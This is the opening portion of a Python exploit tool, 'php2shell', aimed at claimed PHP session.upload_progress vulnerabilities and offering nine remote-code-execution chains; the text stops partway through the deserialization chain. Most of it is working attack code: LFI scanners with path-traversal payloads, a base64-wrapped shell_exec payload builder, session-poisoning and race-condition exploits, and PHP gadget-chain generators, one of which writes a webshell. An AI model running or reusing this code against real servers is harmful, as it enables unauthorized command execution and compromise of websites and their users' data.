#!/usr/bin/env python3
"""
php2shell — CVE-2026-109618 / CVE-2026-109619 Ultimate Exploit

Multi-chain exploit for PHP's session.upload_progress heap UAF vulnerabilities.
Implements 9 independent RCE chains for maximum target coverage.

Attack Chains:
  1 — Session Poisoning + LFI      (needs: upload_progress ON + LFI)
  2 — Deserialization Gadgets       (needs: upload_progress ON + framework gadget)
  3 — /proc/self/fd Race            (needs: LFI + Linux /proc)
  4 — phpinfo() Temp File Leak      (needs: phpinfo page + LFI)
  5 — Log Poisoning                 (needs: LFI + readable log file)
  6 — PEARCMD.php                   (needs: LFI + pearcmd + register_argc_argv)
  7 — /proc/self/environ            (needs: LFI + /proc readable)
  8 — PHP Wrappers (input/data)     (needs: LFI + allow_url_include)
  9 — UAF Disturbance Race          (needs: upload_progress ON + session pages)

Usage:
  python3 php2shell.py -t http://target -c "id"
  python3 php2shell.py -t http://target --chain 2 -c "id"
  python3 php2shell.py -t http://target --chain 9 -c "id"
  python3 php2shell.py -t http://target --shell
  python3 php2shell.py -t http://target --scan
  python3 php2shell.py -t http://target --check
  python3 php2shell.py --targets urls.txt -c "id"

Research sources:
  - Sansec, watchTowr, Huntress, Brandefense, SocRadar
  - ikow/php2shell-poc (ANALYSIS.md — 5-chain architecture, handler mismatch)
  - murrez/php2shell (smart 618, verdict scoring, session fixation probe)
  - slabbdev/php2shell (race harness, concurrent disturbance modes)
  - 0x4148/CVE-2026-109618 (FPM stall, fastcgi_request_buffering)
  - Is4yev/php2shell-poc (crash framework, concurrent session reinit)
  - eness/php2shell-PoC (zval pointer analysis, WAF rules)
  - HackTricks (LFI2RCE techniques, session upload progress, temp files)
  - PayloadsAllTheThings (log poisoning, pearcmd, phpinfo race, /proc)
  - PHPGGC (ambionics — deserialization gadget chains)
  - Synacktiv (PHP filter chain generator concept)

Author: Security Research Team
License: MIT — For authorized security research and education only.
"""

import argparse
import base64
import io
import json
import logging
import os
import random
import re
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse, quote

import urllib3
import requests
from requests.adapters import HTTPAdapter

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = "5.0.0"

BANNER = r"""
    ____  __  ______  _____ _____ __         ____
   / __ \/ / / / __ \|__  // ___// /_  ___  / / /
  / /_/ / /_/ / /_/ / /_ <\__ \/ __ \/ _ \/ / /
 / ____/ __  / ____/___/ /__/ / / / /  __/ / /
/_/   /_/ /_/_/   /____/____/_/ /_/\___/_/_/

  CVE-2026-109618 / CVE-2026-109619
  PHP session.upload_progress RCE
  v{ver}  —  9-chain multi-vector exploit
""".format(ver=__version__)

# ── Logging ──────────────────────────────────────────────────────────────────

log = logging.getLogger("php2shell")

class _Fmt(logging.Formatter):
    C = {"DEBUG": "\033[90m", "INFO": "\033[94m", "WARNING": "\033[93m",
         "ERROR": "\033[91m", "CRITICAL": "\033[91;1m"}

    def format(self, r):
        r.msg = f"{self.C.get(r.levelname, '')}{r.msg}\033[0m"
        return super().format(r)

def _setup_log(verbose, quiet):
    lvl = logging.DEBUG if verbose else (logging.WARNING if quiet else logging.INFO)
    h = logging.StreamHandler()
    h.setFormatter(_Fmt("%(message)s"))
    log.setLevel(lvl)
    log.addHandler(h)

# ── Constants ────────────────────────────────────────────────────────────────

MARKER_S = "<!--p2s:s-->"
MARKER_E = "<!--p2s:e-->"

LFI_PARAMS = [
    "file", "page", "include", "path", "doc", "document", "template", "lang",
    "language", "view", "content", "module", "load", "action", "url", "dir",
    "folder", "pg", "site", "cat", "inc", "locate", "show", "section",
    "layout", "theme", "read", "filename", "root", "navigate", "open",
]

TRAVERSAL_LINUX = [
    "../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "....\\....\\....\\....\\etc\\passwd",
]

TRAVERSAL_WIN = [
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "../../../../../../../windows/win.ini",
    "C:\\windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\xampp\\apache\\conf\\httpd.conf",
]

LFI_SIGNATURES = {
    "linux": ["root:x:0:0", "root:*:0:0", "daemon:x:1:1", "/bin/bash", "/bin/sh"],
    "windows": ["; for 16-bit app support", "[fonts]", "[extensions]", "[boot loader]"],
    "php_filter": [],
}

SESSION_PATHS_LINUX = [
    "/var/lib/php/sessions", "/var/lib/php/session", "/var/lib/php5/sessions",
    "/var/lib/php7/sessions", "/tmp", "/var/tmp", "/opt/php/sessions",
    "/run/php/sessions",
]

SESSION_PATHS_WINDOWS = [
    "C:\\Windows\\Temp", "C:\\xampp\\tmp", "C:\\wamp64\\tmp", "C:\\wamp\\tmp",
    "C:\\php\\sessions", "C:\\Temp", "C:\\inetpub\\temp\\sessions",
]

UPLOAD_ENDPOINTS = [
    "/upload.php", "/index.php", "/admin/upload.php", "/wp-admin/admin-ajax.php",
    "/api/upload", "/file/upload", "/media/upload", "/images/upload",
    "/contact.php", "/submit.php", "/form.php", "/post.php", "/ajax.php",
    "/includes/upload.php", "/admin.php", "/login.php", "/register.php",
    "/profile.php", "/settings.php", "/process.php", "/handler.php",
]

LOG_PATHS = [
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/httpd/access_log", "/var/log/httpd/error_log",
    "/usr/local/apache/log/error_log", "/usr/local/apache2/log/error_log",
    "/var/log/auth.log", "/var/log/mail", "/var/log/vsftpd.log",
    "/var/log/sshd.log",
    "/proc/self/fd/2", "/proc/self/fd/7",
    "/proc/1/fd/1", "/proc/1/fd/2",
    "/dev/stderr", "/dev/stdout",
    "/var/log/php-fpm.log", "/var/log/php8.4-fpm.log",
    "/var/log/php_errors.log",
]

PEARCMD_PATHS = [
    "/usr/local/lib/php/pearcmd.php", "/usr/share/php/pearcmd.php",
    "/usr/lib/php/pearcmd.php", "/usr/share/pear/pearcmd.php",
]

SESSION_TRIGGER_PATHS = [
    "/", "/index.php", "/session.php", "/login.php", "/admin/", "/admin/index.php",
    "/wp-login.php", "/wp-admin/", "/user/login", "/auth/login",
    "/dashboard", "/dashboard.php", "/profile.php", "/account.php",
    "/cart.php", "/checkout.php", "/register.php", "/signup.php",
]

# ── Utility ──────────────────────────────────────────────────────────────────

def rand_sid(n=26):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def b64_payload(cmd):
    enc = base64.b64encode(cmd.encode()).decode()
    return f'{MARKER_S}<?php echo shell_exec(base64_decode("{enc}")); ?>{MARKER_E}'


def b64_system_cmd(cmd):
    enc = base64.b64encode(cmd.encode()).decode()
    return f'echo {MARKER_S} && echo {enc} | base64 -d | sh && echo {MARKER_E}'


def extract_output(body):
    s = body.find(MARKER_S)
    e = body.find(MARKER_E)
    if s == -1 or e == -1:
        return None
    result = body[s + len(MARKER_S):e]
    return None if "<?php" in result else result


def _rce_success(chain_name, output, **details):
    print()
    log.info(f"\033[92m[+] RCE SUCCESS via {chain_name}!\033[0m")
    for k, v in details.items():
        log.info(f"    {k}: {v}")
    print()
    print("=" * 60)
    print(output.strip())
    print("=" * 60)


# ── HTTP Session ─────────────────────────────────────────────────────────────

def make_http(proxy=None):
    s = requests.Session()
    s.verify = False
    s.max_redirects = 10
    adapter = HTTPAdapter(max_retries=1)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    })
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


# ── Recon ────────────────────────────────────────────────────────────────────

def recon(base_url, proxy=None):
    result = {
        "reachable": False, "php_version": None, "server": None,
        "upload_progress": None, "cleanup": None, "session_path": None,
        "os": None, "sapi": None, "redirects": [], "phpinfo_url": None,
        "allow_url_include": None, "register_argc_argv": None,
    }
    http = make_http(proxy)
    try:
        r = http.get(f"{base_url}/", timeout=15, allow_redirects=True)
    except requests.RequestException as e:
        log.error(f"Connection failed: {e}")
        return result

    result["reachable"] = True
    result["server"] = r.headers.get("Server", "")

    srv = result["server"].lower()
    if "win" in srv or "win64" in srv or "win32" in srv:
        result["os"] = "windows"
    elif any(x in srv for x in ["unix", "centos", "ubuntu", "debian", "linux", "red hat"]):
        result["os"] = "linux"

    if r.history:
        result["redirects"] = [x.headers.get("Location", "") for x in r.history]

    powered = r.headers.get("X-Powered-By", "")
    if "PHP/" in powered:
        result["php_version"] = powered.split("PHP/")[1].split()[0]

    for path in ["/index.php", "/info.php", "/phpinfo.php", "/", "/php_info.php"]:
        try:
            r2 = http.get(f"{base_url}{path}", timeout=10, allow_redirects=True)
        except requests.RequestException:
            continue
        body = r2.text

        if not result["php_version"]:
            m = re.search(r"PHP Version[:\s</td><>]+(\d+\.\d+\.\d+)", body)
            if m:
                result["php_version"] = m.group(1)

        if "phpinfo()" in body or "<title>phpinfo()</title>" in body:
            result["phpinfo_url"] = f"{base_url}{path}"

        if result["upload_progress"] is None and "session.upload_progress.enabled" in body:
            m = re.search(r"upload_progress\.enabled\s*</td>\s*<td[^>]*>\s*(On|Off)", body, re.I)
            if m:
                result["upload_progress"] = m.group(1).lower() == "on"

        if result["session_path"] is None:
            m = re.search(r"session\.save_path\s*</td>\s*<td[^>]*>\s*([^<]+)", body)
            if m:
                result["session_path"] = m.group(1).strip()

        if result["cleanup"] is None:
            m = re.search(r"upload_progress\.cleanup\s*</td>\s*<td[^>]*>\s*(On|Off)", body, re.I)
            if m:
                result["cleanup"] = m.group(1).lower() == "on"

        if result["allow_url_include"] is None:
            m = re.search(r"allow_url_include\s*</td>\s*<td[^>]*>\s*(On|Off)", body, re.I)
            if m:
                result["allow_url_include"] = m.group(1).lower() == "on"

        if result["sapi"] is None:
            m = re.search(r"Server API\s*</td>\s*<td[^>]*>\s*([^<]+)", body, re.I)
            if m:
                result["sapi"] = m.group(1).strip()
            else:
                m = re.search(r"<td>SAPI</td>\s*<td>([^<]+)", body, re.I)
                if m:
                    result["sapi"] = m.group(1).strip()

        if result["register_argc_argv"] is None:
            m = re.search(r"register_argc_argv\s*</td>\s*<td[^>]*>\s*(On|Off)", body, re.I)
            if m:
                result["register_argc_argv"] = m.group(1).lower() == "on"

        if result["php_version"]:
            break

    http.close()
    return result


def print_recon(info):
    if not info["reachable"]:
        log.error("[-] Target not reachable.")
        return
    log.info(f"[+] PHP:              {info['php_version'] or 'unknown'}")
    log.info(f"[+] Server:           {info['server'] or 'unknown'}")
    log.info(f"[+] OS (guess):       {info['os'] or 'unknown'}")
    if info["upload_progress"] is True:
        log.info("[+] upload_progress:  \033[92mON\033[0m")
    elif info["upload_progress"] is False:
        log.warning("[!] upload_progress:  \033[93mOFF\033[0m")
    else:
        log.info("[*] upload_progress:  unknown")
    if info["cleanup"] is True:
        log.warning("[!] cleanup:          \033[93mON\033[0m (use --race for Chain 1)")
    elif info["cleanup"] is False:
        log.info("[+] cleanup:          \033[92mOFF\033[0m")
    if info["session_path"]:
        log.info(f"[+] session_path:     {info['session_path']}")
    if info.get("sapi"):
        log.info(f"[+] SAPI:             {info['sapi']}")
    if info["phpinfo_url"]:
        log.info(f"[+] phpinfo:          {info['phpinfo_url']}")
    if info["allow_url_include"] is True:
        log.info("[+] url_include:      \033[92mON\033[0m")
    elif info["allow_url_include"] is False:
        log.info("[*] url_include:      OFF")
    if info.get("register_argc_argv") is True:
        log.info("[+] argc_argv:        \033[92mON\033[0m")
    elif info.get("register_argc_argv") is False:
        log.info("[*] argc_argv:        OFF")
    if info["redirects"]:
        log.info(f"[*] Redirects:        {' -> '.join(info['redirects'])}")


# ── Framework Detection ──────────────────────────────────────────────────────

def detect_framework(base_url, http):
    frameworks = []
    try:
        r = http.get(f"{base_url}/", timeout=10, allow_redirects=True)
    except requests.RequestException:
        return frameworks

    hdrs = {k.lower(): v.lower() for k, v in r.headers.items()}
    body = r.text.lower()
    cookie_names = {c.name.lower() for c in r.cookies}

    if "laravel_session" in cookie_names or "xsrf-token" in cookie_names:
        frameworks.append("laravel")
    elif "laravel" in hdrs.get("set-cookie", ""):
        frameworks.append("laravel")

    if "x-debug-token" in hdrs or "symfony" in body:
        frameworks.append("symfony")
    else:
        for path in ["/_profiler/", "/bundles/framework/"]:
            try:
                r2 = http.get(f"{base_url}{path}", timeout=4)
                if r2.status_code < 404:
                    frameworks.append("symfony")
                    break
            except requests.RequestException:
                pass

    if "wp-content" in body or "wp-includes" in body:
        frameworks.append("wordpress")
    if "ci_session" in cookie_names:
        frameworks.append("codeigniter")
    if "_csrf" in cookie_names and "yii" in body:
        frameworks.append("yii")

    for path in ["/vendor/autoload.php", "/composer.json"]:
        try:
            r2 = http.get(f"{base_url}{path}", timeout=4)
            if r2.status_code < 404 and len(r2.text) > 10:
                txt = r2.text.lower()
                if "monolog" in txt and "monolog" not in frameworks:
                    frameworks.append("monolog")
                if "guzzle" in txt and "guzzle" not in frameworks:
                    frameworks.append("guzzle")
                if "laravel" in txt and "laravel" not in frameworks:
                    frameworks.append("laravel")
        except requests.RequestException:
            pass

    return frameworks


# ── PHP Serialization Helpers ────────────────────────────────────────────────

def _ps(s):
    """Serialize a PHP string."""
    b = s.encode("latin-1") if isinstance(s, str) else s
    return b"s:" + str(len(b)).encode() + b':"' + b + b'";'


def _pi(n):
    """Serialize a PHP integer."""
    return f"i:{n};".encode()


def _pb(v):
    """Serialize a PHP boolean."""
    return b"b:1;" if v else b"b:0;"


def _pa(items):
    """Serialize a PHP array from (key, serialized_value) pairs."""
    body = b""
    for k, v in items:
        body += (_pi(k) if isinstance(k, int) else _ps(k)) + v
    return b"a:" + str(len(items)).encode() + b":{" + body + b"}"


def _po(classname, props):
    """Serialize a PHP object from (key, serialized_value) pairs."""
    body = b""
    for k, v in props:
        body += _ps(k) + v
    cn = classname.encode() if isinstance(classname, str) else classname
    return (b"O:" + str(len(cn)).encode() + b':"' + cn + b'":' +
            str(len(props)).encode() + b":{" + body + b"}")


def _pp(name):
    """Protected property name: \\0*\\0name"""
    return "\x00*\x00" + name


def _pv(classname, name):
    """Private property name: \\0classname\\0name"""
    return "\x00" + classname + "\x00" + name


# ── Gadget Chain Generators ──────────────────────────────────────────────────
#
# Each returns raw serialized PHP bytes for a given command.
# Based on PHPGGC (ambionics/phpggc) chains and public research.

def _gadget_laravel_pb(cmd):
    """
    Laravel/RCE — PendingBroadcast + Events\\Dispatcher
    Target: Laravel 5.4+ / PHP 7.x
    Chain:  PendingBroadcast.__destruct → events.dispatch(event)
            Dispatcher.dispatch → getListeners → call_user_func('system', cmd)
    """
    c = cmd.encode("utf-8")
    listeners = _pa([(cmd, _pa([(0, _ps("system"))]))])
    dispatcher = _po("Illuminate\\Events\\Dispatcher", [
        (_pp("listeners"), listeners),
        (_pp("wildcardsCache"), _pa([])),
    ])
    return _po("Illuminate\\Broadcasting\\PendingBroadcast", [
        (_pp("events"), dispatcher),
        (_pp("event"), _ps(cmd)),
    ])


def _gadget_laravel_rce2(cmd):
    """
    Laravel/RCE2 — PendingBroadcast + Bus\\Dispatcher
    Target: Laravel 5.6-9.x / PHP 7.x
    Chain:  PendingBroadcast.__destruct → events.dispatch(event)
            Bus\\Dispatcher.dispatch → dispatchToQueue → queueResolver(cmd)
    Note:   queueResolver = 'system' — works on PHP 7, may TypeError on PHP 8.
    """
    c = cmd.encode("utf-8")
    bus_dispatcher = _po("Illuminate\\Bus\\Dispatcher", [
        (_pp("queueResolver"), _ps("system")),
    ])
    return _po("Illuminate\\Broadcasting\\PendingBroadcast", [
        (_pp("events"), bus_dispatcher),
        (_pp("event"), _ps(cmd)),
    ])


def _gadget_monolog(cmd):
    """
    Monolog/RCE — BufferHandler + StreamHandler file write.
    Target: Monolog 1.18-2.x
    Chain:  BufferHandler.__destruct → close → flush → handler.handle(record)
            StreamHandler writes formatted record to a PHP file.
    Note:   Two-stage — first writes webshell, then executes via LFI.
            Returns (gadget_bytes, shell_path) tuple.
    """
    shell_path = f"/tmp/p2s_{rand_sid(8)}.php"
    shell_content = b64_payload(cmd)

    record = _pa([
        ("message", _ps(shell_content)),
        ("context", _pa([])),
        ("level", _pi(100)),
        ("level_name", _ps("DEBUG")),
        ("channel", _ps("p2s")),
        ("extra", _pa([])),
        ("formatted", _ps(shell_content + "\n")),
    ])

    stream_handler = _po("Monolog\\Handler\\StreamHandler", [
        (_pp("url"), _ps(shell_path)),
        (_pp("level"), _pi(100)),
        (_pp("bubble"), _pb(True)),
    ])

    gadget = _po("Monolog\\Handler\\BufferHandler", [
        (_pp("handler"), stream_handler),
        (_pp("bufferSize"), _pi(-1)),
        (_pp("buffer"), _pa([(0, record)])),
        (_pp("level"), _pi(100)),
        (_pp("initialized"), _pb(True)),
        (_pp("bufferLimit"), _pi(-1)),
    ])
    return gadget, shell_path


def _gadget_guzzle(cmd):
    """
    Guzzle/Info — FnStream.__destruct (detection gadget)
    Target: Guzzle 6.0-6.3.2
    Chain:  FnStream.__destruct → call_user_func(_fn_close)
    Note:   _fn_close is called with no args. Can only call no-arg functions.
            Uses phpinfo() as indicator of deserialization. Not a direct RCE.
            Returns (gadget_bytes, None) — no shell path.
    """
    methods = _pa([("close", _ps("phpinfo"))])
    gadget = _po("GuzzleHttp\\Psr7\\FnStream", [
        (_pv("GuzzleHttp\\Psr7\\FnStream", "methods"), methods),
        ("_fn_close", _ps("phpinfo")),
    ])
    return gadget, None


def _gadget_symfony(cmd):
    """
    Symfony/RCE — Symfony Process via __destruct.
    Target: Symfony 2.x-5.x
    Chain: Process.__destruct → stop() → closes pipes and reads remaining output.
           With status=started, the destructor calls stop() which signals SIGTERM/SIGKILL.
           The commandline is not re-executed on destruct — this is a crash/DoS gadget,
           not a direct RCE. Useful as a probe for Symfony deserialization.
    """
    return _po("Symfony\\Component\\Process\\Process", [
        (_pp("commandline"), _ps(cmd)),
        (_pp("status"), _ps("started")),
        (_pp("exitcode"), _ps("-1")),
    ])


GADGET_MAP = {
    "laravel":     [_gadget_laravel_pb, _gadget_laravel_rce2],
    "symfony":     [_gadget_symfony],
    "monolog":     [_gadget_monolog],
    "guzzle":      [_gadget_guzzle],
    "wordpress":   [_gadget_laravel_pb],
    "codeigniter": [],
    "cakephp":     [],
    "yii":         [],
}


# ── LFI Scanner (3-Phase) ───────────────────────────────────────────────────

def _crawl_links(base_url, http):
    param_urls = set()
    paths = set()
    visited = set()
    to_visit = [base_url + "/"]
    host = urlparse(base_url).hostname

    for _ in range(2):
        next_round = []
        for url in to_visit:
            if url in visited:
                continue
            visited.add(url)
            try:
                r = http.get(url, timeout=5, allow_redirects=True)
            except requests.RequestException:
                continue
            for m in re.finditer(r'(?:href|src|action)=["\']([^"\'#]+)', r.text, re.I):
                link = urljoin(url, m.group(1))
                p = urlparse(link)
                if p.hostname != host:
                    continue
                if p.query:
                    param_urls.add(link)
                if p.path.endswith(".php"):
                    paths.add(p.path)
                next_round.append(link.split("?")[0])
        to_visit = list(set(next_round) - visited)[:50]

    return list(param_urls), list(paths)


def _check_alive(http, url):
    try:
        r = http.head(url, timeout=3, allow_redirects=True)
        if r.status_code < 400:
            return url
        r = http.get(url, timeout=3, allow_redirects=True)
        return url if r.status_code < 400 else None
    except requests.RequestException:
        return None


def _test_lfi(http, url, param, payload, signatures):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

    try:
        r = http.get(test_url, timeout=5, allow_redirects=True)
    except requests.RequestException:
        return None

    body = r.text

    if "php://filter" in payload and "convert.base64-encode" in payload:
        for chunk in re.findall(r'[A-Za-z0-9+/=]{40,}', body):
            try:
                decoded = base64.b64decode(chunk).decode("utf-8", errors="ignore")
                for sigs in signatures.values():
                    for sig in sigs:
                        if sig in decoded:
                            return {"url": test_url, "param": param, "payload": payload,
                                    "evidence": f"b64:{sig}", "type": "php_filter"}
            except Exception:
                pass
        return None

    for os_type, sigs in signatures.items():
        if os_type == "php_filter":
            continue
        for sig in sigs:
            if sig in body:
                return {"url": test_url, "param": param, "payload": payload,
                        "evidence": sig, "type": os_type}
    return None


def scan_lfi(base_url, proxy=None, target_os=None, threads=25):
    http = make_http(proxy)
    findings = []
    stop_flag = threading.Event()

    log.info("[*] Phase 1: Crawling target ...")
    param_urls, discovered_paths = _crawl_links(base_url, http)
    log.info(f"    Crawled URLs with params: {len(param_urls)}")
    log.info(f"    Discovered PHP paths: {len(discovered_paths)}")

    log.info("[*] Phase 2: Checking which endpoints exist ...")
    candidates = set()
    for url in param_urls:
        candidates.add(url.split("?")[0])

    dirs = {base_url}
    for p in discovered_paths:
        parent = p.rsplit("/", 1)[0]
        if parent:
            dirs.add(f"{base_url}{parent}")

    lfi_files = ["view.php", "page.php", "index.php", "content.php",
                 "include.php", "download.php", "load.php", "show.php"]
    for d in list(dirs)[:10]:
        for f in lfi_files:
            candidates.add(f"{d.rstrip('/')}/{f}")
    for p in discovered_paths:
        candidates.add(f"{base_url}{p}")

    candidates = list(candidates)
    log.info(f"    Candidate endpoints: {len(candidates)}")

    alive = []
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futs = {pool.submit(_check_alive, http, u): u for u in candidates}
        for f in as_completed(futs):
            r = f.result()
            if r:
                alive.append(r)

    log.info(f"    Live endpoints: {len(alive)}")
    if not alive:
        http.close()
        log.info("[*] No live endpoints found")
        return []

    payloads = ["../../../../../../../etc/passwd",
                "....//....//....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=/etc/passwd"]
    if target_os == "windows":
        payloads = ["..\\..\\..\\..\\..\\..\\windows\\win.ini",
                    "../../../../../../../windows/win.ini",
                    "php://filter/convert.base64-encode/resource=/etc/passwd"]
    elif target_os != "linux":
        payloads.append("..\\..\\..\\..\\..\\..\\windows\\win.ini")

    top_params = ["file", "page", "path", "include", "doc", "template",
                  "lang", "view", "content", "load", "dir", "url"]

    test_jobs = []
    for ep in alive:
        real_params = set()
        for pu in param_urls:
            if pu.split("?")[0] == ep:
                real_params.update(parse_qs(urlparse(pu).query, keep_blank_values=True).keys())
        params_to_test = list(real_params) if real_params else top_params
        for param in params_to_test:
            for payload in payloads:
                test_jobs.append((f"{ep}?{param}=test", param, payload))

    total = len(test_jobs)
    log.info(f"[*] Phase 3: Testing {total} combinations ...")
    done_count = [0]

    def do_test(url, param, payload):
        if stop_flag.is_set():
            return None
        return _test_lfi(http, url, param, payload, LFI_SIGNATURES)

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futs = {pool.submit(do_test, u, p, pl): (u, p) for u, p, pl in test_jobs}
        for f in as_completed(futs):
            done_count[0] += 1
            if done_count[0] % 100 == 0 or done_count[0] == total:
                log.info(f"    Progress: {done_count[0]}/{total}")
            result = f.result()
            if result:
                key = (urlparse(result["url"]).path, result["param"])
                if not any((urlparse(x["url"]).path, x["param"]) == key for x in findings):
                    findings.append(result)
                    log.info(f"    \033[92m[FOUND]\033[0m LFI: {result['param']}= "
                             f"on {urlparse(result['url']).path} "
                             f"({result['evidence'][:40]})")
                    stop_flag.set()

    http.close()
    log.info(f"[*] Scan complete: {len(findings)} LFI endpoint(s) found")
    return findings


# ── Upload Endpoint Finder ──────────────────────────────────────────────────

def find_upload_endpoints(base_url, proxy=None, threads=15):
    http = make_http(proxy)
    valid = []

    log.info("[*] Scanning for multipart POST endpoints ...")

    try:
        r = http.get(f"{base_url}/", timeout=5, allow_redirects=True)
        for m in re.finditer(
                r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*action=["\']([^"\']*)', r.text, re.I):
            action = urljoin(base_url, m.group(1))
            if action not in valid:
                valid.append(action)
                log.info(f"    [FORM] {action}")
        for m in re.finditer(
                r'<form[^>]*action=["\']([^"\']*)[^>]*enctype=["\']multipart/form-data', r.text, re.I):
            action = urljoin(base_url, m.group(1))
            if action not in valid:
                valid.append(action)
    except requests.RequestException:
        pass

    def try_post(ep):
        url = f"{base_url}{ep}"
        try:
            r = http.post(url, files={"file": ("t.txt", b"t", "text/plain")},
                          timeout=4, allow_redirects=True)
            if r.status_code < 404:
                return url
        except requests.RequestException:
            pass
        return None

    with ThreadPoolExecutor(max_workers=threads) as pool:
        for result in pool.map(try_post, UPLOAD_ENDPOINTS):
            if result and result not in valid:
                valid.append(result)

    base_result = try_post("/")
    if base_result and base_result not in valid:
        valid.append(base_result)

    http.close()
    log.info(f"    Found {len(valid)} endpoint(s)")
    return valid


# ── Session Trigger Page Finder ──────────────────────────────────────────────

def _find_session_pages(base_url, http):
    pages = []
    for path in SESSION_TRIGGER_PATHS:
        url = f"{base_url}{path}"
        try:
            r = http.get(url, timeout=5, allow_redirects=True, cookies={})
            set_cookie = r.headers.get("Set-Cookie", "")
            if "PHPSESSID" in set_cookie or any(c.name == "PHPSESSID" for c in r.cookies):
                pages.append(url)
        except requests.RequestException:
            pass
    return pages


# ── Session Fixation Check ───────────────────────────────────────────────────

def check_session_fixation(base_url, proxy=None):
    """Verify if target accepts attacker-supplied session IDs (fixation)."""
    http = make_http(proxy)
    sid = rand_sid()
    try:
        r = http.get(f"{base_url}/", cookies={"PHPSESSID": sid}, timeout=10)
        set_cookie = r.headers.get("Set-Cookie", "")
        if sid in set_cookie:
            http.close()
            return True
        if "PHPSESSID=" in set_cookie and sid not in set_cookie:
            http.close()
            return False
    except requests.RequestException:
        pass
    http.close()
    return None


# ── Throttled Upload Stream ──────────────────────────────────────────────────

class ThrottledStream(io.RawIOBase):
    """File-like object that sends data in slow chunks for race windows."""

    def __init__(self, data, chunk_size=256, delay=0.03):
        self._data = data if isinstance(data, bytes) else data.encode()
        self._pos = 0
        self._chunk_size = chunk_size
        self._delay = delay

    def readinto(self, b):
        if self._pos >= len(self._data):
            return 0
        n = min(len(b), self._chunk_size, len(self._data) - self._pos)
        b[:n] = self._data[self._pos:self._pos + n]
        self._pos += n
        time.sleep(self._delay)
        return n

    def readable(self):
        return True


# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 1 — Session Poisoning + LFI
# ═══════════════════════════════════════════════════════════════════════════

def exploit(base_url, cmd, session_path, inject_ep, lfi_url, lfi_param, proxy=None):
    sid = rand_sid()
    sess_file = f"{session_path}/sess_{sid}"
    payload = b64_payload(cmd)

    log.debug(f"    SID: {sid}  File: {sess_file}")
    http = make_http(proxy)
    http.cookies.set("PHPSESSID", sid)

    try:
        r_inject = http.post(inject_ep,
            data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
            files={"file": ("blob", io.BytesIO(b"\x00" * 4096), "application/octet-stream")},
            timeout=15, allow_redirects=True)
        log.debug(f"    Inject response: {r_inject.status_code}")
    except requests.RequestException as e:
        log.error(f"Injection failed: {e}")
        http.close()
        return None

    parsed = urlparse(lfi_url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[lfi_param] = [sess_file]
    trigger_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
    log.debug(f"    Trigger: {trigger_url}")

    try:
        r = http.get(trigger_url, timeout=15, allow_redirects=True)
        log.debug(f"    LFI response ({r.status_code}): {r.text[:300]}")
    except requests.RequestException as e:
        log.error(f"LFI trigger failed: {e}")
        http.close()
        return None

    http.close()
    return extract_output(r.text)


def exploit_race(base_url, cmd, session_path, inject_ep, lfi_url, lfi_param,
                 threads=15, attempts=200, proxy=None):
    sid = rand_sid()
    sess_file = f"{session_path}/sess_{sid}"
    payload = b64_payload(cmd)
    result_box = []
    stop = threading.Event()

    log.info(f"[*] Racing with {threads} threads, {attempts} attempts ...")

    def inject_loop():
        http = make_http(proxy)
        http.cookies.set("PHPSESSID", sid)
        while not stop.is_set():
            try:
                http.post(inject_ep,
                    data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
                    files={"file": ("b", io.BytesIO(b"\x00" * 8192),
                             "application/octet-stream")},
                    timeout=10, allow_redirects=True)
            except requests.RequestException:
                pass
        http.close()

    def trigger_loop():
        http = make_http(proxy)
        parsed = urlparse(lfi_url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[lfi_param] = [sess_file]
        trigger = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        for _ in range(attempts):
            if stop.is_set():
                break
            try:
                r = http.get(trigger, timeout=10, allow_redirects=True)
                out = extract_output(r.text)
                if out and out.strip():
                    result_box.append(out)
                    stop.set()
                    break
            except requests.RequestException:
                pass
        http.close()

    injectors = [threading.Thread(target=inject_loop, daemon=True)
                 for _ in range(max(1, threads - 1))]
    for t in injectors:
        t.start()

    trigger = threading.Thread(target=trigger_loop, daemon=True)
    trigger.start()
    trigger.join(timeout=60)
    stop.set()
    for t in injectors:
        t.join(timeout=2)

    return result_box[0] if result_box else None


# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 2 — Deserialization via Gadget Injection
# ═══════════════════════════════════════════════════════════════════════════

def exploit_deser(base_url, cmd, frameworks, proxy=None,
                  lfi_url=None, lfi_param=None):
    """
    Injects serialized gadget via PHP_SESSION_UPLOAD_PROGRESS pipe delimiter.
    Session key becomes: upload_progress_|<serialized object>
    When session is read, PHP's session handler splits on '|' and deserializes
    the object, triggering __destruct → RCE.
    No LFI needed — requires framework with gadget class + session_start().
    Two-stage gadgets (Monolog/Guzzle) write a shell file, then LFI includes it.
    """
    http = make_http(proxy)

    gadgets = []
    for fw in frameworks:
        for gen in GADGET_MAP.get(fw, []):
